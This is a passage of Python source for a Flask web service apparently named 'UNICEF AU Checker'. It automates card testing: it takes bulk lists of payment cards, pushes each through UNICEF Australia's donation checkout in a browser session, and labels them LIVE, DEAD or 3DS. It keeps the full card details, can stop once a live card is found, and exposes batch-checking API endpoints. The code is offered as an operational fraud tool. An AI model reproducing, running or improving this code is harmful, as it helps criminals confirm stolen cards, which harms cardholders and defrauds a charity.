            return 'decline'

        threeds_phrases = [
            '3d secure', '3-d secure', 'authentication required',
            'verify your identity', 'additional verification',
            'authenticate your payment', 'complete the verification',
            'verification required',
            'autenticación requerida', 'verificación requerida',
        ]
        if any(p in all_text for p in threeds_phrases):
            return 'threeds'
        if any(k in url for k in ('authenticate', '3ds', 'challenge')):
            return 'threeds'

        return 'unknown'

    def check_single_card(self, card_string, amount=None):
        try:
            return self.check_card_in_session(card_string, amount)
        finally:
            self._teardown_session()


# ============================================================
# WORKER
# ============================================================
def process_cards_worker(cards, amount, stop_on_live):
    global checking_status
    checker = UnicefChecker(headless=HEADLESS)
    try:
        for i, card_line in enumerate(cards):
            if not checking_status['active']:
                break

            parts = card_line.strip().split('|')
            if len(parts) < 4:
                checking_status['error'] += 1
                checking_status['results'].append({
                    'id': i+1, 'card': 'INVALID', 'status': 'ERROR',
                    'message': 'Formato inválido',
                    'timestamp': datetime.now().isoformat(),
                })
                continue

            last4 = parts[0][-4:]
            checking_status['current'] = f"****{last4}"
            logger.info(f"━━━ [{i+1}/{len(cards)}] ****{last4} ━━━")

            result = checker.check_card_in_session(card_line, amount)

            checking_status['results'].append({
                'id': i+1, 'card': f"****{last4}", 'full_card': card_line,
                'status': result.get('status', 'ERROR'),
                'original_status': result.get('original_status', ''),
                'message': result.get('message', ''),
                'gate': 'UNICEF AU', 'amount': amount,
                'timestamp': datetime.now().isoformat(),
                'response': result.get('response', {}),
                'success': result.get('success', False),
            })
            checking_status['processed'] += 1

            st = result.get('status')
            if st == 'LIVE':
                checking_status['live'] += 1
                if stop_on_live:
                    checking_status['active'] = False
                    break
            elif st == 'DEAD':
                checking_status['decline'] += 1
            elif st == '3DS':
                checking_status['threeds'] += 1
            else:
                checking_status['error'] += 1

            time.sleep(1)
    finally:
        checker._teardown_session()
    checking_status['active'] = False


# ============================================================
# ENDPOINTS
# ============================================================
@app.route('/')
def index():
    return jsonify({
        "status": "online", "service": "UNICEF AU Checker", "version": "2.5",
        "mode": "persistent_session + auto_zip + screenshot_on_unknown",
        "endpoints": {
            "health": "/api/health", "status": "/api/status",
            "check_card": "/api/check-card (POST)",
            "check_cards": "/api/check (POST)",
            "results": "/api/results", "cancel": "/api/cancel (POST)",
        },
        "config": {
            "headless": HEADLESS, "donation_amount": DONATION_AMOUNT,
            "cvv_api": bool(CVV_API_URL), "zip_code": ZIP_CODE,
            "max_retries_per_card": MAX_RETRIES_PER_CARD,
        },
    })


@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({'status': 'online', 'service': 'UNICEF AU Checker',
                    'version': '2.5', 'timestamp': datetime.now().isoformat()})


@app.route('/api/status', methods=['GET'])
def get_status():
    return jsonify({
        'active': checking_status['active'], 'processed': checking_status['processed'],
        'live': checking_status['live'], 'decline': checking_status['decline'],
        'threeds': checking_status['threeds'], 'error': checking_status['error'],
        'current': checking_status['current'], 'total': len(checking_status['results']),
    })


@app.route('/api/check-card', methods=['POST'])
def check_single_card_endpoint():
    if checking_status['active']:
        return jsonify({'success': False, 'message': 'Ya hay un chequeo en progreso'}), 400
    data = request.json or {}
    card = data.get('card', '')
    amount = float(data.get('amount', DONATION_AMOUNT))
    if not card or '|' not in card:
        return jsonify({'success': False, 'message': 'Formato inválido'}), 400
    checker = UnicefChecker(headless=HEADLESS)
    return jsonify(checker.check_single_card(card, amount))


@app.route('/api/check', methods=['POST'])
def check_cards():
    global checking_status
    if checking_status['active']:
        return jsonify({'error': 'Ya hay un chequeo en progreso'}), 400
    data = request.json or {}
    cards = data.get('cards', [])
    amount = float(data.get('amount', DONATION_AMOUNT))
    stop_on_live = bool(data.get('stop_on_live', False))
    valid = [c for c in cards if '|' in c and len(c.split('|')) >= 4]
    if not valid:
        return jsonify({'error': 'No hay tarjetas válidas'}), 400
    checking_status = {
        'active': True, 'processed': 0, 'live': 0, 'decline': 0, 'threeds': 0,
        'error': 0, 'current': '', 'results': [], 'thread': None,
        'stop_on_live': stop_on_live,
    }
    t = threading.Thread(target=process_cards_worker,
                         args=(valid, amount, stop_on_live), daemon=True)
    t.start()
    checking_status['thread'] = t
    return jsonify({'success': True,
                    'message': f'Verificación iniciada para {len(valid)} tarjetas',
                    'total': len(valid)})


@app.route('/api/results', methods=['GET'])
def get_results():
    return jsonify({
        'results': checking_status['results'][-100:],
        'stats': {
            'total': len(checking_status['results']),
            'live': checking_status['live'], 'decline': checking_status['decline'],
            'threeds': checking_status['threeds'], 'error': checking_status['error'],
        },
    })


@app.route('/api/cancel', methods=['POST'])
def cancel_check():
    global checking_status
    checking_status['active'] = False
    return jsonify({'success': True, 'message': 'Chequeo cancelado'})


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    debug = os.environ.get('FLASK_ENV', 'development') == 'development'
    logger.info(f"🚀 Puerto {port} (headless={HEADLESS}, amount=${DONATION_AMOUNT}, "
                f"zip=${ZIP_CODE}, retries={MAX_RETRIES_PER_CARD}) — v2.5 debug ON")
    app.run(host='0.0.0.0', port=port, debug=debug, use_reloader=False)